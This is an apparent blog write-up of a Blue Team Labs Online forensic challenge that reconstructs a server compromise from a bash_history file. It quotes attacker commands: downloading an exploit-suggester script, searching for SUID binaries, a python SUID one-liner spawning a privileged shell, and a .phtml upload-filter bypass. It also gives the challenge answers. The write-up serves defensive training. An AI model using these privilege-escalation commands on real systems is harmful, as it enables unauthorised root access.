---
title: "Log Analysis - Privilege Escalation"
categories: ["IT and Cyber Security"]
tags: ['Blue Team Labs Online']
date: 2021-08-09
---

[https://blueteamlabs.online/home/challenge/4](https://blueteamlabs.online/home/challenge/4)

## Contents

- [Introduction](#introduction)
- [Questions](#questions)
  - [What user (other than ‘root’) is present on the server?](#what-user-other-than-root-is-present-on-the-server)
  - [What script did the attacker try to download to the server?](#what-script-did-the-attacker-try-to-download-to-the-server)
  - [What packet analyzer tool did the attacker try to use?](#what-packet-analyzer-tool-did-the-attacker-try-to-use)
  - [What file extension did the attacker use to bypass the file upload filter implemented by the developer?](#what-file-extension-did-the-attacker-use-to-bypass-the-file-upload-filter-implemented-by-the-developer)
  - [Based on the commands run by the attacker before removing the php shell, what misconfiguration was exploited in the ‘python’ binary to gain root-level access? 1- Reverse Shell ; 2- File Upload ; 3- File Write ; 4- SUID ; 5- Library load](#based-on-the-commands-run-by-the-attacker-before-removing-the-php-shell-what-misconfiguration-was-exploited-in-the-python-binary-to-gain-root-level-access-1--reverse-shell--2--file-upload--3--file-write--4--suid--5--library-load)

## Introduction

A server with sensitive data was accessed by an attacker and the files were posted on an underground forum. This data was only available to a privileged user, in this case the ‘root’ account. Responders say ‘www-data’ would be the logged in user if the server was remotely accessed, and this user doesn’t have access to the data. The developer stated that the server is hosting a PHP-based website and that proper filtering is in place to prevent php file uploads to gain malicious code execution. The bash history is provided to you but the recorded commands don’t appear to be related to the attack. Can you find what actually happened?

## Questions

We have a single file, `bash_history`. This is, as the name suggest, the history of commands run in the terminal (bash). This challenge is simply reading through the commands and understanding what they all do.

### What user (other than ‘root’) is present on the server?

In Linux, user directories are located within `/home`. Looking through the logs, on line 21, we see:

```bash
cd /home/daniel/
```

Change directory to daniel's home folder.

> daniel

### What script did the attacker try to download to the server?

We can simply look for scripts, URLs, or methods to download things via bash. Line 32:

```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
```

> linux-exploit-suggester.sh

### What packet analyzer tool did the attacker try to use?

What's the most common packet analyser tool for the command line? Line 47:

> tcpdump

### What file extension did the attacker use to bypass the file upload filter implemented by the developer?

Here we can look for uploads for files (with file extensions). Right at the end, line 63, there is a remove command for deleting a file within an uploads folder:

```bash
rm /var/www/html/uploads/x.phtml
```

> .phtml

### Based on the commands run by the attacker before removing the php shell, what misconfiguration was exploited in the ‘python’ binary to gain root-level access? 1- Reverse Shell ; 2- File Upload ; 3- File Write ; 4- SUID ; 5- Library load

Python is mentioned on line 62:

```bash
./usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Immediately before this, line 61, there is a `find` command:

```bash
find / -type f -user root -perm -4000 2>/dev/null
```

This find looks for files (`-type f`) owned by root (`-user root`) with permissions of 4000 (`-perm -4000`) - relates to SUID files.

> 4